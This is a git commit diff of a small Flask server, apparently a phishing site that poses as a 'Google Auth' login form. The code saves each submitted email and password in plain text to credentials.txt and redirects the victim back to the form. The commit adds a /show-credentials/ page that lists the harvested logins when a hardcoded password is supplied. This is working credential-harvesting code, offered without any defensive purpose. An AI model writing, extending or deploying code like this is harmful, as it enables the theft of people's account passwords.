fdc591cafb7155ae7f929dd99ab99cd90e6f29f1
rEsX09 <robchik439@gmail.com>
2025-07-24 13:11:32 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,11 +1,8 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect, url_for, abort
 
 app = Flask(__name__)
 
-@app.route('/')
-def home():
-    return 'Ej uz <a href="/google-auth/">Google Auth</a>'
-
+# Šis ir tavs login forms
 @app.route('/google-auth/', methods=['GET'])
 def show_form():
     return render_template('google-auth.html')
@@ -15,9 +12,23 @@ def handle_form():
     email = request.form['email']
     password = request.form['password']
 
-    # Saglabāšana failā:
     with open("credentials.txt", "a", encoding="utf-8") as file:
         file.write(f"{email} | {password}\n")
 
-    return render_template('google-auth.html', message="Dati iesniegti!")
-    
+    return redirect(url_for('show_form'))
+
+# Šis endpoint rāda saglabātos datus. Aizsargāsim to ar vienkāršu paroli
+@app.route('/show-credentials/')
+def show_credentials():
+    auth = request.args.get('auth')
+    if auth != 'Robertins1':
+        abort(403)  # Aizliegts piekļūt, ja parole nav pareiza
+
+    try:
+        with open("credentials.txt", "r", encoding="utf-8") as file:
+            data = file.read()
+    except FileNotFoundError:
+        data = "Nav saglabātu datu."
+
+    # Parāda datus vienkāršā lapā
+    return f"<pre>{data}</pre>"
